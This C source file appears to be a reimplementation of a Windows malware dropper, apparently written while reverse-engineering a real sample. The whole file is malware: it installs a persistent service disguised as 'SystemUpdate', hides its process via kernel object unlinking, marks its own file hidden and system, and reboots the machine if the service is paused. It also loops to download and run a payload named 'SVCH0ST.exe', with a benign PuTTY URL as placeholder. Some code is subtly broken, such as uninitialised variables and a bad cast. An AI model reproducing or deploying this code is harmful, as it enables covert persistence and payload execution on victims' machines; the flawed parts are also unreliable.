#include <stdio.h>
#include<windows.h>
#include <winternl.h>
#include <wininet.h>
#include <ntdef.h>
#include "DKOM.h"
#include "downloader.h"

#pragma comment(lib, "wininet.lib")
char* address_list[];

char legit_service_name[]="SystemUpdate";
wchar_t out_modulefilename[MAX_PATH];

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;
int debug=1;


char real_malicious_path[]="C:\\Users\\BLUE_gigi\\Downloads\\SVCH0ST.exe";

//if the user tries to pause the service, the machine will be restarted
void restart_machine(void)
{
    HANDLE ProcessHandle;
    BOOL error_check;
    DWORD DesiredAccess;
    HANDLE *TokenHandle;
    HANDLE token_pointer;
    TOKEN_PRIVILEGES token_privs;

    TokenHandle = &token_pointer;
    DesiredAccess = 0x28;
    token_pointer = (HANDLE)0x0;
    ProcessHandle = GetCurrentProcess();
    error_check = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
    if (error_check != 0) {
        error_check = LookupPrivilegeValueA
                ((LPCSTR)0x0,SE_SHUTDOWN_NAME,
                 &token_privs.Privileges[0].Luid);
        if (error_check != 0) {
            token_privs.PrivilegeCount = 1;
            token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            error_check = AdjustTokenPrivileges
                    (token_pointer,0,&token_privs,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
            if (error_check != 0) {
                ExitWindowsEx(6,0);
            }
        }
    }
    ExitWindowsEx(6,0);

}

int is_hidden; //variable to check if the program EPROCESS has been unlinked from the system list


int __fastcall check_if_hidden(void)

{
    if (is_hidden == 0) {
        is_hidden = 1;
        hide_process();
    }
    return 1;
}

//This function starts the service and performs registry operations
long __cdecl register_service_and_keys(LPCSTR path,LPCSTR serviceName,BYTE *nameAsBytes)
{
    SC_HANDLE hSCManager;
    SC_HANDLE hSCObject;
    LSTATUS openKeyStatus;
    DWORD cbData;
    int status;

    HKEY regKey;
    DWORD newKeyValue;


    hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,2);
    if (hSCManager == (SC_HANDLE)0x0) {
        return 0;
    }
    hSCObject = CreateServiceA(hSCManager,
                               serviceName,
                               serviceName,
                               0xf01ff,
                               0x110,
                               2,
                               1,
                               path,
                               (LPCSTR)0x0,
                               (LPDWORD)0x0,
                               (LPCSTR)0x0,
                               (LPCSTR)0x0,
                               (LPCSTR)0x0);


    //the original function contained a lot of repeated code. If the service manager fails, the function adds a description too
    //I reproduced the same effect without repeating code
   char decryptedName [] = "SYSTEM\\CurrentControlSet\\Services\\SystemUpdate";
   openKeyStatus = RegOpenKeyA((HKEY)0x80000002,(LPCSTR)decryptedName,&regKey);
   if (openKeyStatus == 0) {
       cbData = lstrlenA((LPCSTR)nameAsBytes);

       RegSetValueExA(regKey,"Start",0,4,(BYTE *)&newKeyValue,4);

       if (hSCObject != (SC_HANDLE)0x0)
       {
            CloseServiceHandle(hSCObject);
            CloseServiceHandle(hSCManager);
            RegSetValueExA(regKey,"Description",0,1,nameAsBytes,cbData);
            newKeyValue = 2;
            return 0;
       }
   }
  return status & 0xffffff00;
}


VOID WINAPI ServiceCtrlHandler (DWORD request)
{
    switch(request) {
        case SERVICE_CONTROL_PAUSE:
            serviceStatus.dwWin32ExitCode = 0;
            serviceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &serviceStatus);
            //restart machine if user tries to pause
            restart_machine();
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwWin32ExitCode = 0;
            serviceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &serviceStatus);
            return;

        default:
            register_service_and_keys(out_modulefilename, legit_service_name, (BYTE *) (char) legit_service_name);
    }
    SetServiceStatus(hStatus,  &serviceStatus);
}



VOID WINAPI malicious_code ()
{
    serviceStatus.dwServiceType        = SERVICE_WIN32;
    serviceStatus.dwCurrentState       = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode      = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint         = 0;
    serviceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler("SpamService", (LPHANDLER_FUNCTION)ServiceCtrlHandler);

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &serviceStatus);
    SetServiceStatus (hStatus, &serviceStatus);

    //hide file, make it harder to delete
    SetFileAttributes((LPCSTR) out_modulefilename, 7);
    check_if_hidden();
    address_list[0]="https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
    address_list[1]="https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
    address_list[2]="https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
    address_list[3]="https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
    while (1) {
        //I tried to simplify this loop, but making the program run EXACTLY one time is tricky,
        //unless timeouts are very big or I do exactly as the original implementation
        while(1)
        {
            Sleep(5000);
            //repeatedly check if desired window is active
            HANDLE window=FindWindow("PuTTYConfigBox","PuTTY Configuration");
            if(window==NULL)
                break; //if not, execute the file again
sleep_and_check:
            Sleep(5000);
        }
        if(debug){
            printf("Malicious window not found. Proceeding to execute\n");
        }
        Sleep(1000);
        HINSTANCE result=ShellExecute(0,0,real_malicious_path,0,0,0);
        if(result<32) //if the file is not present, download it
        {
            if(debug){
                printf("Malicious file not found. Proceeding to download\n");
            }

            //The original program downloads data in a temporary file, and then transfers the modified data
            //back to the "original" malicious program file. I have not been able to understand the
            //data transformation so I removed the feature
            int success = download_and_create_mal(address_list,real_malicious_path);
            if (success) {
                if(debug){
                    printf("Download succeeded. Executing the program\n");
                }
                Sleep(1000);
                ShellExecuteA((HWND)0x0,(LPCSTR)0x0,(LPCSTR)real_malicious_path,(LPCSTR)0x0,(LPCSTR)0x0,0);
                goto sleep_and_check;

            }
            else{
                if(debug){
                    printf("Download failed. Hiding and deleting leftover files\n");
                }
                Sleep(30000);
                SetFileAttributesA((LPCSTR)real_malicious_path,0);
                DeleteFileA((LPCSTR)real_malicious_path);
                //Sleep(30000);
            }

        }
    }
}


int main() {


    register_service_and_keys(out_modulefilename, legit_service_name, (BYTE *) (char) legit_service_name);
    SERVICE_TABLE_ENTRY ServiceTable[] = {
            {"SpamService", (LPSERVICE_MAIN_FUNCTION) malicious_code},
            {NULL, NULL}
    };

    if(debug){
        printf("%lu\n",GetModuleFileName(0,out_modulefilename,MAX_PATH));
    }

    StartServiceCtrlDispatcher(ServiceTable);
    SetFileAttributes((LPCSTR) out_modulefilename, 7);
    return 0;
}
